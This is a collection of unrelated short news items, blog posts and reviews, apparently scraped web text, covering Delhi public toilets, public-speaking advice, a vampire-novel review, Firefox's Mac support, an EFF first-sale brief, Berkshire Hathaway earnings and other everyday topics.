City officials are encouraging companies to build 250 new toilet facilities -- “ fully air - conditioned , with flowerpots and large mirrors ” -- around the capital .
“ We are all set to usher in a toilet revolution in the city , ” Amiya Chandra , head of the city department handling the project , told the media at the launch .
The city has suggested that restaurant companies fund construction in order to attract customers into adjoining eateries or , as news website Mid-Day.com explained : “ Have a full meal inside without pinching your nose . ”
Chandra said the project promised to lend an artistic flair to India ’s capital .
“ Presently , the city of Delhi resembles a stinking toilet , ” he said , “ but we are trying hard to make toilets an aesthetic experience . ”

My first time speaking professionally in public was back in 2005 at the first An Event Apart in Philadelphia .
While not my first time speaking in front of a big audience , it was the first time I had to prepare a slide deck and use Keynote .
Before and after view of a slide deck .
On the left , you can see the bright red used to slides that need work , as well as black and grey for title slides , and blue for quotations .
Understandably , I was nervous , so beforehand , I had scribed lots of notes to guide me as I was speaking .
On the big day , I used Keynote ’s “ presenter mode ” which allows the presenter to see their notes while the audience sees the normal slides .
A few slides in , I realized my grave mistake : I had entirely too many notes than would fit on my small screen , and no way to access the hidden ones .
I was lost .
I did n’t completely bomb , but I was n’t great either .
The mishap threw me off and made my delivery dry and hurried .
I had spent so much time writing the talk , I had n’t even thought about what I wanted to say .
I was onstage without a point — or one that I was aware of without my notes .
At that point , I realized that I could n’t let technology do the talking .
Maybe it was watching people like Jeffrey or Eric , whose presentation styles are loose and conversational , but I realized that if I had any hope of injecting a bit of myself into a talk , I would have to get the information into my head rather than on my screen .
Since then I ’ve done a good bit of public speaking , and I ’ve never given a talk that way again .
I ’ve collected some pointers below that help me prepare on what I want to say , but I give no assurances .
These are things that work for me ; what works for you might be completely different .
Public speaking , especially good public speaking , is tough as hell , and I do n’t claim to be an expert .
Your Slides Are Not Your Talk
Even though slides are what most people equate with “ the talk , ” depending on your presentation style , they are actually one of the least important aspects .
Focus on what you want to say .
I start out by making outlines in a notebook and flagging things I know I have information on , or things I need to research further .
If you ’ve read anything I ’ve written over the years , you ’ll probably see this process is similar to how I do many things , building with small steps and not worrying about the final product too early .
I try to find a story whenever possible , or at least try to give a talk a natural arc .
Collections of assorted tips and tricks can be great if you ’re that kind of speaker , but I ’ve found this does n’t work as well for me .
Most times I like posing an argument then supporting and building on it over the course of a talk .
So how do you find your arc ?
Focus on the message that you ’re trying to convey and make sure all your points support it .
That , and do n’t worry about the design of your slides until it ’s time to start worrying .
When I start working things up in Keynote , I use just three colors for slides .
Black for titles , grey for secondary titles , and blue for quotations ( if any ) .
I transfer my outline into Keynote and build a structure around those three colors .
When I hit an unknown slide , where I know something should go but I do n’t know what that something is yet , I drag a red swatch from the color palette onto that slide to change the background to bright red .
I can go back later and see where the problem areas are at a glance .
( This is not dissimilar to Cory Doctorow ’s tip for inserting “ TK ” when writing . )
Working this way allows me to build and write a talk in stepped approach .
I introduce a limited number of slide types to help me reign in my thoughts and stay focused .
I go through the deck in multiple passes , adding more detail and refinement each time until the story really starts to take shape .
Only then do I start to worry about the actual design of the slides .
Do n’t Be Small
I have two basic rules for slide design : simple and big .
Type should always be big enough to read from the back of the room , and simplicity is best to convey information quickly .
For instance , when I use imagery , I only use images that take up the full slide .
And usually without any text .
Just a simple big picture and then I fill in the rest of the story during the talk .
I generally lean towards having lots of slides because I like having lots of examples or alternate ways of presenting information .
Throw Yourself A Line
I often think of a slide as the little graphics superimposed next to a news anchor ’s head on TV .
There is just enough space to convey a starting point to a thought , not always the thought itself .
It ’s your job as the presenter to deliver the story .
I often employ short titles and phrases of one or two words and talk around that thought .
This not only has the advantage of forcing you to turn your attention to the audience instead of worrying about what your slide says , but it also makes the presentation more special .
You , the speaker , not the slides , are conveying the information .
This is n’t something that can just be read and your presence inconsequential .
I never memorize what I want to say .
Instead , I rehearse so that I know the concepts I ’m trying to convey .
The slides serve as my mental triggers : I see the title of the slide and it makes me remember the important parts of the idea I want to discuss .
Then I just talk through the key points , which has the added benefit of bringing about a natural improvisation during the presentation , and hopefully , helps me act a bit more naturally .
I never use presenter notes or the presenter display mode anymore , I see exactly what the audience sees .
Reading Can Be Deadly
You are not invisible up in front of everyone , so merely reading bullet points off a slide that anyone in the audience can clearly read themselves is not enough .
Your mood , body language , and delivery all affect the message .
The presentation is just as much about you as the material you ’re presenting .
Abraham Lincoln Vampire Hunter takes gigantic liberties .
But if you can allow your imagination to accept the incontrovertible fact that our 16th President also killed vampires on the side , you 'll be entertained right up until John Wilkes Booth 's fanged appearance .

After Seth Grahame - Smith 's Pride and Prejudice and Zombies lit / genre mash - up book came and went like the novelty we all believed it was , I was less than hopeful that the author 's next book would be entertaining .
I was wrong .
Grahame - Smith 's second book is a breezy read , filled with fun references , but it goes so over the top , you do n't have time to be offended by the history bending .
The story moves forward at a fast pace , with engaging dialog and fascinating tidbits about the past president 's life , both true and false .
The book opens with the author describing his monotonous existence in Rhinebeck , NY — until one day , a man who always seemed to be a stranger bestows upon him the missing journals of Abraham Lincoln , revealing him to be none other than the world 's most successful vampire hunter .
Why does our first - person author believe this mystery man from upstate New York ?
Because he 's a vampire .
And just like that , you 're re-learning everything you ever knew about oneo f the greatest Presidents of the United States .

Grahame - Smith takes real life events , and weaves them with first person accounts of vampire attacks and fanged demons from the fake journals , and the result is surprisingly entertaining .
And this is coming from someone who visited Lincoln 's home in New Salem bi-yearly with her family , and treats the Ken Burns Civil War Documentary like the Holy Grail .
Once you let go of the idea that this is n't trying to make fun of past history , nor undermine the actual work Lincoln did , it 's sort of like one of the Back To The Future alternate timelines .
What if Abraham Lincoln fought vampires ?
Turns out he'd still have the same family issues , work ethic and life goals , but for different reasons .
For instance , the main reason Abraham becomes such a devout vampire - killer is due to the death of his mother , which Abraham quickly discovers was at the hands of vampires , thanks to his no - good father 's money issues .
Sure , the doctors said she died from " milk sickness , " which is actually what his mother was historically diagnosed with , but in the novel it 's actually vampires .
If you can get around that first hurdle , you 're golden through the rest of the novel .
If you can't , then you 're going to have a hell of a time when the band of Union Vampires takes on the Rebel Vampires , or when Lincoln 's first son dies not from sickness , but from vampiric tampering .
And that 's not even the most extreme version of the historical liberties this book takes .

Every rumor and myth about Honest Abe gets twisted to embellish the horror premise .
What about Abe 's beard ?
Legends say he grew it because Grace Bedell wrote that women loved whiskers .
But in this alternate timeline , the beard was groomed to hide the scar from Lincoln 's vampire - fighting life .
Luckily , the book does make an attempt to educate the reader slightly , with footnotes relating side facts and other interesting historical moments — some of them accurate , or at least rumored to be .
The book itself broken down into three segments , Boy , Vampire Hunter , and President .
With photos and etchings illustrating the many " facts " the journals present — my favorite being the capture of a member of Lincoln 's trilogy .
The " President " section being the darkest of the three , plagued with Civil War , Vampire War , multiple assassination attempts and of course , his and his family 's demise .
But the darkness is a good thing , since it helps the narrative deal with the tragic times that the United States faced .
I mean , if you 're going to introduce blood - sucking vampires into a time when we lost 2 % of the entire population to war , you 'd better be ready to make it darker .
And for some strange reason , it all works .
It 's an engaging and entertaining read that slips both in and out of historical works and genre fun easily .

It 's rather laughable because when you think about it , Abe did have all the makings of a great vampire slayer — more so than the rest of the past American Presidents .
A commanding presence , a weathered " I 've seen too much " face , the long duster - like coat ( in which he kept his slaying ax hidden ) , a broken family forever plagued by monsters , a moral code set higher than the current medium , and of course the ability to kick plenty of ass ( I 'm assuming his 6 ft. 4 in. helped in this particular area ) .
Heck he even had a Giles - type trainer , who is possibly still running around the globe today .
He 's basically Buffy with a beard .
All and all it's an engaging and entertaining read .
Seth Grahame - Smith knows how to adapt his writing specifically to a time , place and tone .
Plus , even though we all know what 's going to happen next , the monster twists keep us guessing .
It 's a burn - through , beach book type of read , and about as much fun as an episode of Supernatural .
Not about to change anyone 's life , but still worth the short time it takes to read it .
Mozilla has officially ditched Firefox support for Apple Mac OS X 10.4 for upcoming versions of its browser , despite gripes from some web surfers .
The open source group confirmed on Tuesday that , following heated discussion from the Mozilla community , it would only support Mac OS X 10.5 or later when it released the next iteration of its browser .
" We believe a Mac OS X 10.5 minimum will allow us to provide the best experience possible to our users , " said Mozilla Mac programmer Josh Aas in a mailing list message .
The decision was essentially an academic one after Mozilla confirmed plans in early February to release version 1.9.3 of its Gecko rendering engine later this year .
At the same time support for Tiger will be dropped altogether , even though the Mozilla Foundation estimated that nearly 1.5 million Mac OSX 10.4 users are still surfing the web with Firefox 3.5 .
Meanwhile 36,000 Tiger - fanciers are running Firefox 3.6 , which is Mozilla ’s current version of its popular browser .
Mozilla spun out Firefox 3.6 earlier this year , which does support Tiger .
“ This does not affect current users of Firefox , or updates to Firefox 3.6 : Mac OS X 10.4 will continue to be supported via Firefox 3.6 until its end - of - life ( not yet scheduled ) , ” said Aas .
“ Thanks to everyone who provided input on this issue .
We believe a Mac OS X 10.5 minimum will allow us to provide the best experience possible to our users . " ®

You bought it , you own it .
That 's a concept we 've been fighting to defend for years against erosion at the hands of patent and copyright owners , in contexts as diverse as printer cartridges , promo CDs , and software .
The answer should be simple — if you bought it , a copyright or patent owner should n't be able to use federal intellectual property law to dictate whether you can resell it , simply by pointing to boilerplate in a license agreement or label .
That 's thanks to the " first sale doctrine " ( also known as " exhaustion " ) .
Today EFF , joined by national library associations , the Consumer Federation of America , Public Knowledge , and U.S. PIRG , filed an amicus brief in Vernor v. Autodesk , the latest battle to raise the question of whether the " first sale doctrine " will continue to have vitality in a world filled with end - user license agreements that claim that you own nothing , but rather merely " license " it .
The appeal pits eBay seller Timothy Vernor against software giant Autodesk .
When Mr. Vernor tried to auction four authentic , packaged copies of AutoCAD software , Autodesk sent DMCA takedown notices to block his auctions and threatened to sue him for copyright infringement .
Mr. Vernor , assisted by the lawyers at Public Citizen , took Autodesk to court and won .
Autodesk has appealed , arguing that so long as its license agreements recite the right magic words , it can strip purchasers of any ownership in the CD - ROMs on which software is delivered .
If that 's right , then not only do n't you own the software you buy , but any copyright owner can simply recite the magic words and effectively outlaw libraries , used bookstores , and DVD rentals , among other things ( eBay also filed an amicus brief on behalf of Mr. Vernor ) .
That would be bad news not just for consumers looking to save a few dollars , but also for our ability to access older , out - of - print materials .
For these materials , often libraries and second - hand sellers are the only hope for continued public access .
This appeal is one of three pending before the Ninth Circuit that touch on " you bought it , you own it " issues .
Along with EFF 's pending petition with the Copyright Office to permit iPhone jailbreaking ( which also turns on what rights you have as a software owner ) , these three cases promise to have a substantial impact on the shape of the " first sale doctrine " in the digital age .

The Catholic Education Service claim that their campaigning has led to Ed Balls tabling an amendment to the Children , Schools and Families Bill regarding Sex and Relationships Education that could effectively enable faith schools to opt out of providing sex education based on facts rather than religious dictats .
The amendment states that the following sections of the Bill “ are not to be read as preventing the governing body or head teacher of a [ faith ] school from causing or allowing PSHE to be taught in a way that reflects the school ’s religious character ” :
… information presented in the course of providing PSHE should be accurate and balanced .
… PSHE should be taught in a way that is appropriate to the ages of the pupils concerned and to their religious and cultural backgrounds , and also reflects a reasonable range of religious , cultural and other perspectives .
… PSHE should be taught in a way that endeavours to promote equality , encourages acceptance of diversity , and emphasises the importance of both rights and responsibilities .
In other words , the school ’s religious convictions – which could include viewing homosexuality , sex before marriage and contraception use as sins – would be allowed to override the need to provide accurate , fair and inclusive sex education .
This is appalling ( and how sad is it that the Catholic campaigners feel threatened by ‘ accurate and balanced information ’ and ‘ equality and diversity ’ ? ) .
The state school system should exist to provide all children with a comprehensive education that values and respects their rights and identities and those of others and encourages free thought ; it should not be making concessions to religious leaders who have their own – potentially harmful – agenda .
Personally , I think religious faith should have no place in the running of state schools , but given that things are unlikely to change any time soon , the Education Secretary should at least be ensuring that children who do attend these schools do not miss out on essential parts of their education and are not fed faith - based lies about such important issues as contraception and sexual relationships .
The British Humanist Association have more information and details of how you can ask your MP to vote against the amendment , which is due to be debated in Parliament this coming Tuesday 23 February .
A month or so ago , my girlfriend decided to come see me , so I booked her a ticket online .
We decided to go with easyjet as they were quite a bit cheaper , paid the 240 euros and were happy about it .
Cue next month , the day comes , my girlfriend goes to the airport all excited about coming over and easyjet tells her that her name is not the same as the first name listed in her ID card .
I had used her pet name instead of her full , legal name ( think “ jenny ” instead of “ jennifer ” ) in the booking , not thinking twice about it ( other airlines have accepted my misspelt last name just fine ) .
easyjet would have none of this , and had her pay 260 euros extra , which is more than the original cost of the ticket for a simple name change .
Apart from the obvious , there are more things wrong with this picture :
Nowhere in the official easyjet terms ( or anywhere else I could see ) is mentioned anything about the name being the same as on the ID card .
They are n’t a government authority , the only reason they need a name for is to verify that the person paying for the flight is the person traveling .
Even if they had her full name , how would they know it was n’t someone with the same name ?
Because they had her ID card number .
That ’s right , they had the number of her ID card and they made her pay 260 euros extra to change her name to verify that it is actually her .
How does it make sense to let someone change the name on the card to verify that they are themselves ?
.
That ’s right , they had the number of her ID card and they made her pay 260 euros extra to change her name to verify that it is actually her .
How does it make sense to let someone change the name on the card to verify that they are themselves ?
The TOS state that name changes can be made up to an hour before the flight for a nominal fee , unless the flight is full .
She was there more than one hour before the flight , and the flight was not full ( there were empty seats on the plane ) .
This tactic is insidious and extortionary .
They take advantage of your panic and worry over missing the plane and to coerce you to pay more than what you paid for the ticket .
My girlfriend was very disturbed at the thought of missing the flight , as we had been planning this for months in advance and was the only chance she had to take time off work .
If this is not extortion , I do n’t know what is .
I called easyjet on the same day , only to be put on hold for many minutes and pay another ten pounds on call charges .
Nobody ever picked up .
Now , four days later , nobody has responded to the issue I have raised in their tracker .
260 euros to change an entry in a database that has no bearing on anything else ?
There is no reason why this should be the case , except to extort money out of people trying to see their loved ones .
I cannot describe the anger I feel at being blatantly taken advantage of and then ignored for days .
In short , I will try my best to make sure that neither me nor anyone I know flies with easyjet again , unless they want days ’ worth of their hard labour to be taken away because of technicalities .
easyjet are far beyond being a horrible airline to being a malicious , blackmailing one .
easyjet sucks .
Rep. Alan Grayson appeared on Democracy Now ! to discuss his bill , “ The Public Option Act , ” which allows people under sixty - five to buy into Medicare .
The bill has attracted fifty co-sponsors :
REP .
ALAN GRAYSON : I ’ve introduced a simple three - and - a - half - page bill that opens up Medicare to anybody who wants it .
If you want it and you pay for it , it ’s yours .
It ’s that simple .
It ’s open to everybody under the age of sixty - five , whether or not you ’re handicapped .
And you pay the same amount as other people your age would pay .
And the reason to do this is because we need a public option .
We need an option that does n’t involve putting us at the tender mercies of insurance companies , particularly if there ’s a mandate to do so .
A lot of people feel that there is a fundamental conflict of interest between themselves and private insurance companies .
The private insurance companies make money by denying you the care that you need to be healthy , and sometimes to stay alive .
And a lot of people are just sick of it .
So the way to get beyond that is to open up Medicare , which is now available to only one - eighth of the population , to anybody who ’s willing to pay for it .
And it makes perfect sense when you think about it .
I mean , we do n’t say the federal highways are only open to senior citizens .
And the Medicare provider network is an enormously valuable , expensive thing that we ’ve created with federal tax dollars that ought to be open to everyone , not just seniors .
AMY GOODMAN : And how does this fit into the major piece of legislation that will or — I do n’t know would even pass — wo n’t be voted on by the House ?
REP .
ALAN GRAYSON : My hope was that we would vote not only on the Senate bill , which does n’t have a public option , not only on the reconciliation amendment , which probably will not have a public option , but that we ’d also vote on this , that there ’d be three votes instead of two votes .
And if we voted on this and we passed it , then it would be presented to the Senate and subject to reconciliation in the Senate , so that we could end up with a public option .
AMY GOODMAN : Now ?
REP .
ALAN GRAYSON : Now .
AMY GOODMAN : Right , but now ?
REP .
ALAN GRAYSON : And if not , then it ’s something to build for in the future .
ANJALI KAMAT : And would you support the bill even if your bill does n’t go through ?
REP .
ALAN GRAYSON : Well , if you ’re talking about the Senate bill combined with the reconciliation fix , the answer is yes , because that ’s a bill that saves lives and saves money .
And I feel that to do that , to deny 30 million Americans the insurance that they would have under that bill , the Senate bill with the reconciliation fix , would be cutting your nose to spite my face .
So I would be very reluctant to vote against a bill that will end up doing so much good for the Americans who do n’t have insurance and also help to restrain the growth , the large growth , of premiums for those who do , and make insurance manageable for people and establish certain minimum standards .
Those are all good things to do .
But I think it ’s a better thing to do to combine all of those things with the public option .
We ’ve heard all year long from the Democratic leadership and from the President that we need a public option to provide competition to insurance companies where there is no competition .
All over the country , including many places in Florida , we have markets where insurance companies have 80 percent of the market , if there ’s only one or two of them .
So it ’s a monopoly or it ’s an oligopoly for 80 percent of the market or more .
And those insurance companies charge you whatever they want , and they give you whatever little care they can get away with .
And that ’s true all over the country .
If Medicare was available to anybody who was willing to pay for it , then in a place where there was an insurance company monopoly there ’d be two choices .
In a place where there are two choices already , there ’d be three choices .
And that ’s going to be a dramatic improvement .
Photographer Jim LoScalzo went to rediscover the lost coal mining towns of Appalachia , but instead of just taking pictures , he shot video .
I love the way he blends sound and images with subtle editing to create mood you can't get with a photo slideshow alone .
And even though most of his shots are of still objects , with the camera set on a tripod , the subtlest bits of movement in the frame , like a gentle snow falling , give the images a life they would n't have had otherwise .
Mesmerizing and haunting .

The Top 10 Gadgets of the Decade Ten of the gadget world 's greatest hits from the past decade .
Dec. 2 , 2009  -- Maps .
Compact disk players .
Film .
Paperback books .
Ten years ago , we could n't live without them .
Today , they 're inching closer and closer to obsolescence .
The past decade has delivered a bounty of consumer electronics that make our lives easier , keep us connected and ensure that we 're endlessly entertained .
But a few have gone above and beyond , altering the way we organize , experience and share our daily lives .
Here are 10 of the gadget world 's greatest hits from the past 10 years .
The iPod
The digital music player was already on the scene when Apple introduced the iPod in 2001 .
But it was n't exactly hyperbole when Apple CEO Steve Jobs said , " Listening to music will never be the same again . "
The iPod -- and its signature white earbuds -- quickly became a cultural icon .
But its impact was hardly cosmetic .
Along with iTunes , the iPod popularized the mp3 player and changed the music industry forever .
Stacks of CDs ?
Gone .
Trips to the record store ?
Gone .
Apple made buying music , TV shows and videos as easy as logging on to your home computer and clicking your mouse a few times .
In 2007 , the company announced that it sold its 100 millionth iPod unit , making it the bestselling digital music player of all time .
And the iPod has come a long way .
Since the original iPod that could hold 1,000 songs , Apple has updated the model nearly every year , expanding the line to tiny workout - friendly Shuffles and Nanos and , of course , the iPhone - like iPod Touch .
The current iPod classic ( the model closest to the original ) can hold 40,000 songs .
GPS Devices
Oh , those folding maps .
For a time , they were a staple car accessory , not to mention a road trip necessity .
But now , they 're almost quaint reminders of a bygone era .
In 2000 , the United States discontinued a feature that deliberately degraded GPS signals available to the public .
Overnight , civilian users of GPS devices could pinpoint locations up to 10 times more accurately than before .
And in the years that followed , led by Garmin , GPS devices found their way on to dashboards across the country .
Drivers retired their maps , letting voice - enabled GPS devices ( or in - car navigation systems ) lead them to their destinations .
Now , turn - by - turn directions and information about the nearest gas station and other points of interest are available on car dashboards , iPhones and more .
The BlackBerry
They 're known to be so addictive that they 're often called " CrackBerries . "
Research in Motion 's highly popular BlackBerry mobile device was first introduced as a two - way pager in 1999 , but the now - common BlackBerry smart phone was introduced in 2002 .
The handheld devices , which were initially the gadget of choice for executives and jetsetters , let users send and receive e-mail , access the Internet , take pictures , make phone calls and more .
As the price dropped , their popularity surged , and BlackBerrys found their way into the hands of everyone from urbanites to college students to stay - at - home moms .
When President Barack Obama ascended to the White House , he famously fought to keep his precious BlackBerry , despite national security concerns and a tradition of e-mail - free presidents .
Though the launch of the touchscreen iPhone challenged its share of the smart phone market , BlackBerry has held its own with an easy - to - use keyboard and sophisticated office applications and security features .
Digital cameras
Think back to 10 years ago .
Did you get married ?
Graduate from college ?
Welcome a new child into the world ?
Chances are , you did n't get to see images of those major milestones until at least a few days later .
Now , thanks to the proliferation of the affordable digital camera , memories are captured -- and in many cases , shared -- nearly instantaneously .
Though the digital camera was introduced in the 1990s , it really came into its own in the 2000s , finding its way into the hands of millions around the world .
Even little kids have their own digital cameras .
Unfortunately , the downside of digital photography 's expansion is that your most embarrassing moments might live on the hard drives and Facebook accounts of countless family members and friends .
But the upside is that if you 're fast enough , you can delete those pictures before they ever see the light of day .
TiVo Digital Video Recorder
Remember when you had to make appointments with your living room television ?
If you wanted to watch " Friends , " " Lost " or " Monday Night Football , " you had to adjust your schedule accordingly .
The TiVo Digital Video Recorder and its more recent competitors now let you record those programs and watch them at your leisure -- commercial - free
TiVo pioneered the device in 1997 , but it was in the 2000s that the ad - skipping DVR really took off , sending advertisers and television programmers back to their drawing boards .
LG now offers a DVR - integrated television and some cable providers also provide DVR services .
Nintendo's Wii
When Nintendo launched the Wii and Wii Sports in 2006 , it pulled gamers off the couch and into the action , revolutionizing video game play in the process .
Using a wireless controller , players actually simulate actions such as playing tennis , baseball and boxing .
But the game has had successes beyond gaming , including teaching school children music and helping people lose weight .
The USB Flash Drive
The memory disk , the jump drive , the pendrive -- or the USB .
It goes by many names but always serves the same crucial function : storing mountains of information on a miniscule device .
More durable and with more memory than its predecessor the floppy disk , flash drives help us carry documents , photos and more between work and home and school .
They may be among the more humble items on this list , but simple can also be significant .
The iPhone
In June 2007 , diehard Apple fans camped out on city sidewalks for days to be among the first to score the hotly anticipated iPhone .
The first iPhones dropped on June 29 , and within 74 days Apple had sold 1 million of its new devices .
Now it 's said that the number of iPhone and iPod touch units sold has climbed to 40 million .
Whether it's with iPhones , BlackBerries , Android - powered phones or Palm devices , consumers increasingly send and receive e-mail , play games , watch video and access the Internet from mobile phones .
Thanks to the advent of the mobile application , like those in Apple 's App Store and the Android Marketplace , consumers also look to their handheld devices for a host of other practical -- and frivolous -- functions .
Whatever our desire , be it finding the closest public toilet , tracking stocks or starting a car remotely , we now know that " there 's an app for that . "
What 's behind the growth of the ever - smarter phone ?
Technologists say the answer is easy : the iPhone .
E-Book Readers
Bye bye , books ?
Maybe not quite yet , but as e-readers , such as Sony 's Reader and Amazon 's Kindle , gain in popularity , printed novels , textbooks and even newspapers and magazines are slowly retreating into the background .
Sony was the first this decade to offer an e-book reader in 2006 and Amazon 's Kindle quickly followed in 2007 .
But since then , as prices fall and content options rise , the market has continued to grow .
This month , research firm Forrester said 2009 has been a " breakout year " for eReaders and eBooks .
By the end of the year , sales will have more than tripled with content sales up 176 percent for the year .
Netbooks
Earlier this year , some analysts predicted that the PC industry would experience its sharpest shipment decline in history .
But the industry 's fate was changed largely because of one key new computing species : the netbook .
Smaller and cheaper than its cousins the laptop and desktop , the netbook has emerged as an increasingly popular PC option .
The netbooks , or mini-notebooks , can't compete with fully - functional laptops and desktops when it comes to memory , power and battery life .
But they can be had for below $ 300 , a price closer to that of some smart phones than traditional computers .
In addition to the price , their compact size and mobility make them attractive options for consumers .
Taiwan - based Asus introduced the first netbook of the decade in 2007 when it launched the Asus Eee PC ( the three " Es " stand for " Easy to learn , Easy to work , Easy to play ) .
But its competitor , Acer Inc. ( also from Taiwan ) , popularized the category with its 2008 launch of the Acer Aspire One .
Analysts say Acer 's version was the first to do well among retail customers , as its operating system and overall look more closely resembled traditional PCs .
In March , research firm Garter predicted that PC shipments would fall in 2009 by 11.9 percent .
Now , boosted by netbook sales , the firm expects shipments to actually grow by 2.8 percent this year .

When asked by game site Siliconera which game FFXIII director Motomu Toriyama would want to remake , he replied , " That would be Final Fantasy VII ! "
" If we had the manpower and the time to work on a project , if we were to remake Final Fantasy VII with the quality of Final Fantasy XIII it would become a tremendous project , " Toriyama continued .
" If we can get the number of people we need by all means that would be the one I would really want to remake . "
In 2006 , Square Enix released a " technical demo " depicting Final Fantasy VII as it would look in the PlayStation 3 .
The game was originally released on the PlayStation 1 in 1997 .

NEW YORK ( Reuters ) - Warren Buffett ’s Berkshire Hathaway
Inc said fourth - quarter profit surged , helped by derivatives bets tied to global stock markets , though operating profit fell 40 percent as the weakened economy weighed on several businesses .
Billionaire investor Warren Buffett speaks as he and Microsoft Corporation founder Bill Gates appear together for a town hall style meeting with business students broadcast by financial television network CNBC at Columbia University in New York , November 12 , 2009 .
REUTERS / Mike Segar
Profit rose for a third straight quarter , and full - year profit increased 61 percent , as Berkshire rebounded from perhaps its worst year since Buffett took over in 1965 .
“ I was quite impressed with the results , ” said Vahan Janjigian , author of the book “ Even Buffett Is n’t Perfect . ”
“ It is clearly suffering from the economic recession we have been in , but compared with most other companies involved in similar businesses , it is doing quite well , ” he added .
In his annual letter to Berkshire shareholders , Buffett admitted that Berkshire ’s ability to outperform that benchmark “ has shrunk dramatically , ” and that “ our future advantage , if any , will be a small fraction of our historical edge . ”
Net worth per share , which measures assets minus liabilities and is a key metric for Buffett , rose 19.8 percent , compared with a 9.6 percent drop a year earlier .
Still that lagged a 26.5 percent gain including dividends for the Standard & Poor ’s 500 , the first time it trailed since 2004 .
Berkshire ’s net worth per share is up 20.3 percent annually since 1965 , while the S&P 500 is up 9.3 percent .
Total book value rose to $ 131.1 billion ( 86 billion pounds ) from $ 109.27 billion .
Buffett , who in last year ’s letter said the economy would be in “ shambles ” in 2009 , this year struck a more optimistic note .
He said “ residential housing problems should largely be behind us ” within about a year as supply falls into line with demand , though “ prices will remain far below ‘ bubble ’ levels . ”
He also used the letter to lambaste financial industry chief executive officers and directors for bad risk management , suggesting that shareholders have borne too much of the burden of recent massive government bailouts .
“ A board of directors of a huge financial institution is derelict if it does not insist that its CEO bear full responsibility for risk control , ” he said .
“ If he fails at it -- with the government thereupon required to step in with funds or guarantees -- the financial consequences for him and his board should be severe . ”
NET RISES , OPERATING NET FALLS
Fourth - quarter net income for Omaha , Nebraska - based Berkshire rose to $ 3.06 billion , or $ 1,969 per Class A share , from $ 117 million , or $ 76 , a year earlier .
Revenue rose 23 percent to $ 30.2 billion .
Excluding $ 1.03 billion of investment and derivative gains , operating profit to $ 2.03 billion , or about $ 1,308 per share , from $ 3.37 billion , or $ 2,175 .
On that basis , analysts on average expected $ 1,208 per share , according to Thomson Reuters I/B/ E/S .
Year - earlier results reflected $ 3.25 billion of investment and derivative losses , and a one - time fee related to an aborted takeover of Constellation Energy Group Inc .
For all of 2009 , profit rose to $ 8.06 billion , or $ 5,193 per Class A share , from $ 4.99 billion , or $ 3,224 .
Revenue rose 4 percent to $ 112.49 billion .
Berkshire has about 80 businesses that sell such things as Geico car insurance , Dairy Queen ice cream , and Fruit of the Loom underwear .
Two weeks ago it paid $ 26.5 billion for Burlington Northern Santa Fe Corp , the nation ’s second - largest railroad , in Buffett ’s largest takeover .
That and a related stock split won Berkshire admission to the S&P 500 .
Berkshire said it will record a $ 1.1 billion first - quarter gain reflecting a change in how it valued its prior Burlington Northern stake .
In its annual report , Berkshire said operating results for its main business lines , insurance and utilities , “ have not been negatively impacted in any significant way by the recession . ”
Among the insurance operations are a property and casualty business and the General Re reinsurance business .
“ Insurance is a wonderful business , and the absence of super - catastrophes last year helped , ” said Frank Betz , a principal at Carret / Zane Capital Management LLP in Warren , New Jersey , which owns Berkshire stock .
In contrast , earnings fell at most manufacturing , service and retailing units in 2009 , as the recession led to “ lower sales volume , revenues and profit margins as consumers have significantly curtailed spending , particularly for discretionary items . ”
NETJETS ON THE MEND
For example , the NetJets plane leasing unit had pretax losses of $ 180 million in the fourth quarter and $ 711 million for the year .
Its debt had soared to $ 1.9 billion from $ 102 million in the 11 years that Berkshire owned it .
“ I failed you in letting NetJets descend into this condition , ” Buffett said .
Last year , Buffett installed David Sokol , who chairs Berkshire ’s MidAmerican Energy unit and is considered a leading candidate to eventually replace Buffett at Berkshire , to repair NetJets ’ financial condition .
Buffett said NetJets debt is down to $ 1.4 billion , and the unit is now “ solidly profitable . ”
Quarterly results included $ 1.05 billion of pretax gains on derivative contracts , mainly tied to the longer - term performance of stock market indexes .
Buffett said Berkshire changed “ only a few ” derivative positions in the last year , and he still believes they will make money .
Berkshire also got $ 6.3 billion of upfront payments from parties on the other side of the contracts , which it can invest as it wishes .
Berkshire ended the year with $ 30.56 billion of cash , up 20 percent , as Buffett sold stocks such as oil company ConocoPhillips .
About $ 8 billion was reserved for Burlington Northern .
Last year , Berkshire ’s Class A and Class B shares rose just 3 percent and 2 percent , respectively .
This year they are up a respective 21 percent and 22 percent , helped by the addition of Berkshire to the S&P 500 .
The A shares closed Friday at $ 119,800 and the Class B shares at $ 80.13 on the New York Stock Exchange .
Welcome to LOSTies with Jed & Cara !
This is a video podcast starring Jed and Cara - a married couple who love LOST - watch LOST - and awkwardly discuss LOST .
Ryan and Jen they ain't !
Ms. Martin is not a civil rights leader .
She ’s a Brooklyn - based writer who , five years ago , was shocked to find herself in possession of a six - figure book advance .
She wanted to give a chunk of it away , but was not sure how .
So she decided she would make it someone else ’s problem — nine other people ’s problems .
She chose nine thoughtful friends , gave them each $ 100 , and told them they would be expected to account for what they had done with it at a gathering a month later .
Heart - warming high jinks have ensued ever since .
Saturday night marked the fourth annual dance - crazed celebration of what Ms. Martin calls the Secret Society for Creative Philanthropy .
Since that first year , Ms. Martin has been joined by several other small - time philanthropists , who bestow multiples of $ 100 on admired acquaintances .
This year 16 inductees committed creative acts of kindness , some of them kooky , most of them thoughtful .
Someone is publishing the writing of New York students in a nonprofit literacy program .
Someone else bought a video camera for a public high school in Canarsie , Brooklyn .
One recipient , who runs a Web site to encourage female writers , decided to give the money to the most frequent commenter on the site , who turned out to be a former correction officer with dreams of a life in the arts .
Several people doubled down by donating $ 100 of their own money , part of the ripple effect that so often gives small , charmed gestures reach beyond their scope .
( The ripples go as far as San Francisco and Athens , Ga. , where others have started their own chapters of the Secret Society . )
There ’s nothing original or YouTube - worthy about sending $ 100 to help in Haiti , but people did that , too , which also thrilled Ms. Martin ( who said she also gave considerably more money to traditional nonprofits ) .
“ I could not argue giving away 100 flowers is as important as giving money to Paul Farmer , ” Ms. Martin said of the anthropologist who helped found the medical charity Partners in Health .
But , she added , there ’s something to be said for “ a visceral engagement with joy and spontaneity , and injecting more of that into our lives . ”
It ’s a great technological trick that it now takes no more than a text message to send $ 10 to Haiti .
But with that simplicity comes a certain passivity .
There is a benefit , too , to having a creative challenge built into some personal charitable giving — innovation of all kinds requires ownership , reinvention , elaborate consideration .
Have You Maxed Out Your Roth IRA
This Year Yet ?
Seriously .
You think I ’m just joking , but retirement is no laughing matter unless you already accumulated millions and retired early ( in which case you can laugh out loud 24/ 7 ) .
I think everybody should max out their Roth IRA , right now .
Here ’s why .
